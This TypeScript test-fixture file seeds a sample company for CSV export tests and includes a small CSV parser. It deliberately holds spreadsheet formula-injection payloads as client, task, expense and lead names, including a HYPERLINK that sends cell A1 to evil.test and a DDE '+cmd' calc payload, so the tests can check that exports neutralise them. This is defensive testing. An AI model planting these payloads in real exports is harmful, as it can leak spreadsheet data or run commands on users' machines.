import type { Capability } from '@/config/capabilities';
import type { AdminDoc, ClientDoc, ProjectDoc, TaskDoc } from '@/models';
import type { SessionUser } from '@/types/session';
import { makeAuditEntries, actorOf } from './audit-factories';
import { makeClient, makeProject, makeTask } from './domain-factories';
import { insertExpense } from './expense-factories';
import { makeAdmin, makeSuperadmin, sessionFor } from './factories';
import { makeLead } from './lead-factories';
import { D, makeExpense, makePayment, makeTeamPayout, makeThirdPartyPayout, makeWorkLog, makeWorkOrder } from './project-factories';

/**
 * Fixtures for the CSV exports. One small company with a bit of everything, written straight to the database, plus
 * a CSV reader so the tests can assert on cells instead of on string fragments. Several names are deliberately hostile
 * (a formula, a comma and quotes, a leading plus sign) because every export must neutralise them.
 */

/** A fixed financial year, so no test depends on today's date. */
export const FY = { period: 'custom', from: '2026-04-01', to: '2027-03-31' } as const;

/** The same viewer holding exactly these capabilities, and the step-up they came with. */
export const holding = (viewer: SessionUser, ...caps: Capability[]): SessionUser => ({ ...viewer, capabilities: new Set(caps) });
export const without = (viewer: SessionUser, ...caps: Capability[]): SessionUser => ({ ...viewer, capabilities: new Set([...viewer.capabilities].filter((c) => !caps.includes(c))) });

export const HOSTILE_CLIENT = '=HYPERLINK("http://evil.test/?a="&A1,"Click here")';
export const HOSTILE_TASK = "+cmd|' /C calc'!A0";

export interface ExportWorld {
  /** A superadmin with an open step-up: every capability. */
  sa: SessionUser;
  saDoc: AdminDoc;
  dev: AdminDoc;
  devSession: SessionUser;
  other: AdminDoc;
  acme: ClientDoc;
  beta: ClientDoc;
  hostile: ClientDoc;
  site: ProjectDoc;
  app: ProjectDoc;
  siteTask: TaskDoc;
  appTask: TaskDoc;
}

export async function makeExportWorld(): Promise<ExportWorld> {
  const saDoc = await makeSuperadmin({ name: 'Sara Superadmin' });
  const dev = await makeAdmin({ name: 'Dev Person' });
  const other = await makeAdmin({ name: 'Olive Other' });
  const sa = await sessionFor(saDoc, { stepUp: true });

  const acme = await makeClient({
    name: 'Acme Studio',
    status: 'active',
    country: 'IN',
    billingCurrency: 'INR',
    contacts: [{ name: 'Anita Rao', email: 'anita@acme.test', isPrimary: true }],
    accountOwner: { id: dev._id, name: dev.name },
  });
  const beta = await makeClient({ name: 'Beta, "Global" Ltd', status: 'paused', country: 'US', billingCurrency: 'USD' });
  const hostile = await makeClient({ name: HOSTILE_CLIENT, status: 'prospect' });

  const site = await makeProject(acme, {
    name: 'Acme website',
    status: 'active',
    health: 'on_track',
    contract: { pricingModel: 'fixed', amountMinor: 1_000_000, currency: 'INR' },
    lead: { id: dev._id, name: dev.name },
    deadlineOn: D('2026-12-15'),
  });
  const app = await makeProject(beta, {
    name: 'Beta app',
    status: 'in_review',
    health: 'at_risk',
    contract: { pricingModel: 'milestone', amountMinor: 500_000, currency: 'USD' },
  });

  const siteTask = await makeTask(site, {
    title: 'Build the home page',
    status: 'in_progress',
    priority: 'high',
    dueOn: D('2026-11-01'),
    estimateMinutes: 480,
    loggedMinutes: 90,
    assignees: [{ kind: 'admin', id: dev._id, name: dev.name }],
  });
  const appTask = await makeTask(app, { title: HOSTILE_TASK, status: 'todo', priority: 'low' });

  // Time: two entries inside the year (one billable) and one long before it.
  await makeWorkLog(site, siteTask, dev, { minutes: 90, billable: true, workedOn: '2026-10-05' });
  await makeWorkLog(site, siteTask, dev, { minutes: 30, billable: false, workedOn: '2026-10-06' });
  await makeWorkLog(app, appTask, other, { minutes: 60, billable: true, workedOn: '2025-01-10' });

  // Money in: an INR receipt, a USD receipt and a voided entry.
  await makePayment(site, { amountMinor: 125_050, receivedOn: '2026-10-01' });
  await makePayment(app, { amountMinor: 100_000, currency: 'USD', rate: 83.42, receivedOn: '2026-10-03' });
  await makePayment(site, { amountMinor: 50_000, receivedOn: '2026-10-04', status: 'void' });

  // Money out: third-party payouts and a work order.
  await makeThirdPartyPayout(site, { amountMinor: 300_000, status: 'paid', paidOn: '2026-10-02' });
  await makeThirdPartyPayout(app, { amountMinor: 20_000, currency: 'USD', rate: 83.42, status: 'due', dueOn: '2026-10-20' });
  await makeWorkOrder(site, { agreedMinor: 800_000, paidMinor: 300_000 });

  // Expenses: company-paid, and out of pocket by two different people.
  await makeExpense({ amountMinor: 100_000, spentOn: '2026-10-05', status: 'paid' });
  await insertExpense({ paidBy: dev, project: site, status: 'submitted', description: '=1+1 Taxi to the client', spentOn: '2026-10-07', amountMinor: 45_000 });
  await insertExpense({ paidBy: other, status: 'submitted', description: 'Olive lunch', spentOn: '2026-10-08', amountMinor: 30_000 });

  await makeTeamPayout({ amountMinor: 5_000_000, status: 'paid', paidOn: '2026-10-05', allocations: [{ project: site, amountMinor: 3_000_000 }] });

  await makeLead({ name: 'Zoë Åström', email: 'zoe@example.com', company: 'Åström AB', message: '=HYPERLINK("http://evil.test","free quote") please call me', createdAt: new Date('2026-10-02T20:00:00Z') });
  await makeLead({ name: 'Ravi Kumar', status: 'contacted', createdAt: new Date('2026-10-04T08:00:00Z') });

  return { sa, saDoc, dev, devSession: await sessionFor(dev), other, acme, beta, hostile, site, app, siteTask, appTask };
}

/** Audit entries with chosen times, by two people; one carries values and an address hash that no export may show. */
export async function makeExportAudit(sa: AdminDoc, dev: AdminDoc) {
  return makeAuditEntries([
    { at: '2026-10-05T09:00:00Z', actor: actorOf(sa), action: 'client.update', entity: { type: 'client', ref: 'CL-0001', label: 'Acme Studio' }, summary: 'Changed the status', changes: [{ path: 'status', before: 'prospect', after: 'active' }, { path: 'passwordHash', before: 'old-hash', after: 'new-hash' }], ipHash: 'ip-hash-secret', userAgent: 'Mozilla/5.0 secret-agent', requestId: 'req-1' },
    { at: '2026-10-06T20:30:00Z', actor: actorOf(dev), action: 'task.create', entity: { type: 'task', ref: 'PRJ-0001-T001', label: '=1+1 task' }, summary: '+91 98765 note', ipHash: 'ip-hash-secret-2' },
    { at: '2025-02-01T09:00:00Z', actor: actorOf(sa), action: 'client.create', entity: { type: 'client', label: 'Old client' } },
  ]);
}

export interface ParsedCsv {
  header: string[];
  rows: string[][];
  /** Each row keyed by its header. */
  records: Array<Record<string, string>>;
  /** The raw text with the BOM removed. */
  text: string;
}

/** A small RFC 4180 reader (quoted fields, doubled quotes, CRLF) so the tests assert on what a spreadsheet would show. */
export function parseCsv(raw: string): ParsedCsv {
  const text = raw.startsWith('﻿') ? raw.slice(1) : raw;
  const all: string[][] = [];
  let row: string[] = [];
  let field = '';
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i]!;
    if (quoted) {
      if (c === '"' && text[i + 1] === '"') {
        field += '"';
        i++;
      } else if (c === '"') quoted = false;
      else field += c;
    } else if (c === '"') quoted = true;
    else if (c === ',') {
      row.push(field);
      field = '';
    } else if (c === '\r' && text[i + 1] === '\n') {
      row.push(field);
      all.push(row);
      row = [];
      field = '';
      i++;
    } else field += c;
  }
  if (field !== '' || row.length > 0) {
    row.push(field);
    all.push(row);
  }
  const [header = [], ...rows] = all;
  return { header, rows, records: rows.map((r) => Object.fromEntries(header.map((h, i) => [h, r[i] ?? '']))), text };
}
